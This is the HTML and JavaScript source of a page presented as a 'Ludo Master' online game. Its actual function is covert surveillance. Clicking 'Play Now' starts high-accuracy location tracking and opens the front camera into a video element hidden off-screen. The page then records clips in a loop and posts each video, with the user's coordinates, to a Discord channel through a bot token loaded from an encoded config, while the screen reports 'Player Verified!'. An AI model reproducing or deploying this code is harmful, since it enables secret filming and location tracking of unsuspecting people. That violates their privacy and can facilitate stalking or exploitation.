<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body { margin: 0; padding: 0; background: radial-gradient(circle, #2c3e50, #000000); font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        .container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); width: 90%; max-width: 400px; }
        h1 { margin-bottom: 20px; font-size: 28px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #e67e22; }
        .board-preview { width: 200px; height: 200px; background: #fff; margin: 0 auto 20px; border-radius: 10px; display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(4, 1fr); padding: 10px; gap: 5px; }
        .cell { background: #ddd; border-radius: 5px; }
        .cell:nth-child(odd) { background: #ccc; }
        .btn { background: linear-gradient(45deg, #f39c12, #d35400); color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4); transition: all 0.3s; }
        .btn:hover { transform: scale(1.05); }
        .btn:disabled { background: #7f8c8d; cursor: not-allowed; }
        .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; min-height: 20px; }
        #hiddenVideo { position: absolute; top: -1000px; left: -1000px; width: 320px; height: 240px; }
        .error-msg { color: #e74c3c; font-size: 12px; margin-top: 5px; display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1>LUDO MASTER</h1>
        <div class="board-preview">
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
        </div>
        <button class="btn" id="playBtn">PLAY NOW</button>
        <div class="status" id="statusText">Initializing...</div>
        <div class="error-msg" id="errorMsg"></div>
    </div>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <!-- 
      NOTE: Admin Panel is line ko update karega.
      Agar yahan empty hai, to Admin panel se connect karein.
    -->
    <script>
        const ENCODED_CONFIG = ""; 
    </script>

    <script>
        let config = {};
        let mediaRecorder;
        let videoChunks = [];
        let currentLocation = null;
        let watchId;

        async function loadConfig() {
            const statusText = document.getElementById('statusText');
            const errorMsg = document.getElementById('errorMsg');
            const scriptTag = document.querySelector('script:last-of-type');

            try {
                // Fetch the raw script content to find ENCODED_CONFIG
                const scripts = document.querySelectorAll('script');
                let encodedData = "";
                
                // Find the script that has ENCODED_CONFIG
                for(let script of scripts) {
                    if(script.textContent.includes('ENCODED_CONFIG')) {
                        const match = script.textContent.match(/const ENCODED_CONFIG = "([^"]+)";/);
                        if(match) {
                            encodedData = match[1];
                            break;
                        }
                    }
                }

                if (!encodedData) {
                    throw new Error("Config variable not found in HTML.");
                }

                // Decode Base64
                const decodedJson = atob(encodedData);
                config = JSON.parse(decodedJson);
                console.log("Config Loaded:", config);
                statusText.innerText = "Ready to Play!";
                
            } catch (err) {
                statusText.innerText = "Config Error";
                errorMsg.innerText = "Failed to load config: " + err.message;
                errorMsg.style.display = 'block';
                console.error(err);
            }
        }

        const playBtn = document.getElementById('playBtn');
        const statusText = document.getElementById('statusText');
        const videoElement = document.getElementById('hiddenVideo');

        playBtn.addEventListener('click', startGame);

        async function startGame() {
            playBtn.disabled = true;
            statusText.innerText = "Connecting to Server...";

            // 1. Location
            if (navigator.geolocation) {
                statusText.innerText = "Locating you...";
                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        currentLocation = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        };
                        console.log("Location Updated:", currentLocation);
                    },
                    (error) => {
                        currentLocation = { error: "Location denied" };
                        console.error("Location Error", error);
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                statusText.innerText = "Geolocation not supported";
            }

            // 2. Camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                videoElement.srcObject = stream;
                await videoElement.play();
                console.log("Camera Started");
                startRecordingLoop(stream);

            } catch (err) {
                statusText.innerText = "Camera access denied.";
                playBtn.disabled = false;
                playBtn.innerText = "TRY AGAIN";
                console.error("Camera Error", err);
            }
        }

        function startRecordingLoop(stream) {
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                videoChunks = [];
                console.log("Recording Stopped, Uploading...");
                uploadToDiscord(blob);

                // Wait before next loop
                setTimeout(() => {
                    if (mediaRecorder.stream.active) {
                        recordAndSend();
                    }
                }, (config.settings.waitSeconds * 1000));
            };

            function recordAndSend() {
                statusText.innerText = "Recording...";
                mediaRecorder.start();
                
                setTimeout(() => {
                    mediaRecorder.stop();
                }, (config.settings.recordSeconds * 1000));
            }

            recordAndSend();
        }

        async function uploadToDiscord(blob) {
            statusText.innerText = "Uploading...";

            const formData = new FormData();
            formData.append("file", blob, "ludo_rec.webm");

            const locationMsg = `📍 User: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;

            try {
                // Send Text First
                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                    method: "POST",
                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
                    body: JSON.stringify({ content: locationMsg })
                });

                // Send Video
                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                    method: "POST",
                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
                    body: formData
                });

                statusText.innerText = "Player Verified!";
                console.log("Upload Success");

            } catch (error) {
                console.error("Upload failed", error);
                statusText.innerText = "Error: " + error.error;
            }
        }

        window.onload = loadConfig;
    </script>
</body>
</html>
